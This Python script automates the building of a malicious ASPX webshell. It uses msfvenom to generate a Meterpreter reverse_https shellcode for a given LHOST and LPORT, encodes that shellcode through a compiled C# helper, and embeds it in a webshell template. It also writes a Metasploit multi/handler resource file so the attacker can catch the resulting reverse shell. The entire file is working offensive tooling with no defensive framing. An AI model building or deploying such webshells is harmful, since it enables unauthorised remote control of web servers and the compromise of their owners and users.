import os
import subprocess
import re
import argparse

# Create argument parser for capturing LHOST and LPORT values from command line arguments
parser = argparse.ArgumentParser(description='Generate shellcode with specified LHOST and LPORT')
parser.add_argument('--LHOST', required=True, help='LHOST value')
parser.add_argument('--LPORT', required=True, help='LPORT value')

# Parse the provided command line arguments
args = parser.parse_args()

# Define the output directory where all the generated files will be stored
output_dir = "output"

# Create the output directory if it doesn't exist already
if not os.path.exists(output_dir):
    os.makedirs(output_dir)

# Generate the shellcode using msfvenom tool from Metasploit with the provided LHOST and LPORT and save it to 'charp.txt'
msfvenom_command = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={args.LHOST} LPORT={args.LPORT} EXITFUNC=thread -f csharp -o {os.path.join(output_dir, 'charp.txt')}"
os.system(msfvenom_command)

# Read the generated shellcode from 'charp.txt' file
with open(os.path.join(output_dir, "charp.txt"), "r") as f:
    shellcode = f.read()

# Read the content of the ASPX-Helper.cs file
with open("ASPX-Helper.cs", "r") as f:
    vbs_helper_content = f.read()

# Replace the placeholder !!!SHELLCODE!!! with the actual shellcode in the ASPX-Helper.cs content
vbs_helper_content = re.sub(r'!!!SHELLCODE!!!', shellcode, vbs_helper_content)

# Write the modified content with the shellcode to a new file named 'ASPX-Helper_modified.cs'
with open(os.path.join(output_dir, "ASPX-Helper_modified.cs"), "w") as f:
    f.write(vbs_helper_content)

# Compile the modified 'ASPX-Helper_modified.cs' file into a Windows executable 'ASPX-Helper.exe'
compile_command = f"mcs -platform:x64 -unsafe -r:System.Configuration.Install {os.path.join(output_dir, 'ASPX-Helper_modified.cs')} -out:{os.path.join(output_dir, 'ASPX-Helper.exe')}"
subprocess.run(compile_command, shell=True, check=True)

# Change the current working directory to the output directory
os.chdir(output_dir)

# Run the compiled 'ASPX-Helper.exe' program using mono to generate encoded shellcode
run_command = "mono ASPX-Helper.exe"
os.system(run_command)

# Read the content of the generated 'encoded_shellcode.txt' file
with open("encoded_shellcode.txt", "r") as f:
    encoded_shellcode = f.read()

# Change the current working directory back to the main directory
os.chdir("..") 

# Read the content of the 'webshell_template.aspx' file
with open("webshell_template.aspx", "r") as f:
    macro_content = f.read()

# Replace the placeholder !!!ENCRYPTEDSHELLCODE!!! with the actual encoded shellcode in the webshell template content
macro_content = re.sub(r'!!!ENCRYPTEDSHELLCODE!!!', encoded_shellcode, macro_content)

# Write the modified webshell content with the encoded shellcode to a new file named 'WebShellFinal.aspx'
with open(os.path.join(output_dir, "WebShellFinal.aspx"), "w") as f:
    f.write(macro_content)

# Create a Metasploit resource file 'met64.rc
# with the necessary commands to start a multi/handler with the same payload, LHOST and LPORT used for the shellcode generation
with open(os.path.join(output_dir, "met64.rc"), "w") as f:
    f.write(f"use exploit/multi/handler\n")
    f.write(f"set payload windows/x64/meterpreter/reverse_https\n")
    f.write(f"set LHOST {args.LHOST}\n")
    f.write(f"set LPORT {args.LPORT}\n")
    f.write(f"set exitfunc thread\n")
    f.write(f"run -j\n")
